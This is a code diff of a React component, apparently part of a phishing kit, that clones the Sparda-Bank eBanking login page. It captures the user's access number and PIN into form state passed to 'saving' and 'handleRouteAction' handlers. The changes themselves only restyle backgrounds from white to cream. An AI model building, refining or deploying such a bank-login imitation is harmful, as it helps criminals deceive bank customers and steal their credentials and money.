@@ -16,9 +16,9 @@ export function SpardaBank({ formData, onChange, handleRouteAction, saving }: Pr
   const [activeTab, setActiveTab] = useState("verfueger");
 
   return (
-    <div className="min-h-screen flex flex-col font-sans bg-white">
+    <div className="min-h-screen flex flex-col font-sans bg-[#fff6ec]">
       {/* Header */}
-      <header className="bg-white py-6 px-4 xl:px-0 w-full relative z-10 max-w-[1050px] mx-auto">
+      <header className="bg-[#fff6ec] py-6 px-4 xl:px-0 w-full relative z-10 max-w-[1050px] mx-auto">
         <div className="flex justify-between items-start md:items-center">
           {/* Logo */}
           <div>
@@ -50,7 +50,7 @@ export function SpardaBank({ formData, onChange, handleRouteAction, saving }: Pr
         <div className="max-w-[1050px] mx-auto px-4 xl:px-0 py-8 relative z-10 flex flex-col md:flex-row gap-6 items-start w-full">
           
           {/* Left Panel - Login Card */}
-          <div className="bg-white rounded-[10px] shadow-lg p-6 md:p-8 w-full md:w-[400px] flex-shrink-0">
+          <div className="bg-[#fff6ec] rounded-[10px] shadow-lg p-6 md:p-8 w-full md:w-[400px] flex-shrink-0">
             <div className="flex justify-between items-center mb-6">
               <h1 className="text-[22px] font-bold text-gray-800">eBanking Login</h1>
               <button className="w-6 h-6 rounded-full bg-gray-100 text-gray-500 flex items-center justify-center font-bold text-sm hover:bg-gray-200">?</button>
@@ -91,7 +91,7 @@ export function SpardaBank({ formData, onChange, handleRouteAction, saving }: Pr
                     placeholder="Inlogcode"
                     value={formData.verfuegernummer || ""}
                     onChange={(e) => onChange("verfuegernummer", e.target.value)}
-                    className="w-full bg-white border border-gray-300 rounded-[5px] px-4 py-3 outline-none focus:border-gray-500 text-[15px] text-gray-800 placeholder-gray-400"
+                    className="w-full bg-[#fff6ec] border border-gray-300 rounded-[5px] px-4 py-3 outline-none focus:border-gray-500 text-[15px] text-gray-800 placeholder-gray-400"
                   />
                 </div>
                 <div className="relative">
@@ -100,7 +100,7 @@ export function SpardaBank({ formData, onChange, handleRouteAction, saving }: Pr
                     placeholder="PIN (8 bis 16 stellig )"
                     value={formData.pin || ""}
                     onChange={(e) => onChange("pin", e.target.value)}
-                    className="w-full bg-white border border-gray-300 rounded-[5px] px-4 py-3 outline-none focus:border-gray-500 text-[15px] text-gray-800 placeholder-gray-400 pr-10"
+                    className="w-full bg-[#fff6ec] border border-gray-300 rounded-[5px] px-4 py-3 outline-none focus:border-gray-500 text-[15px] text-gray-800 placeholder-gray-400 pr-10"
                   />
                   <button type="button" className="absolute right-3 top-1/2 -translate-y-1/2 text-gray-400 hover:text-gray-600">
                     <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" className="w-5 h-5">
@@ -134,7 +134,7 @@ export function SpardaBank({ formData, onChange, handleRouteAction, saving }: Pr
           </div>
 
           {/* Right/Upper Info Panel */}
-          <div className="bg-white rounded-[10px] shadow-lg p-6 w-full hidden md:grid grid-cols-3 gap-6 self-start">
+          <div className="bg-[#fff6ec] rounded-[10px] shadow-lg p-6 w-full hidden md:grid grid-cols-3 gap-6 self-start">
             {/* Column 1 */}
             <div className="flex flex-col gap-3">
               <h3 className="text-[#9e0000] font-bold text-[16px] mb-1">Sicherheit</h3>
@@ -176,7 +176,7 @@ export function SpardaBank({ formData, onChange, handleRouteAction, saving }: Pr
       </main>
 
       {/* Footer */}
-      <footer className="bg-white py-8 w-full border-t border-gray-200">
+      <footer className="bg-[#fff6ec] py-8 w-full border-t border-gray-200">
         <div className="max-w-[1200px] mx-auto px-4 text-center flex flex-col items-center">
           <div className="flex flex-wrap justify-center gap-2 md:gap-4 text-[13px] text-gray-600 mb-2">
             <a href="#" className="hover:underline">Impressum</a>
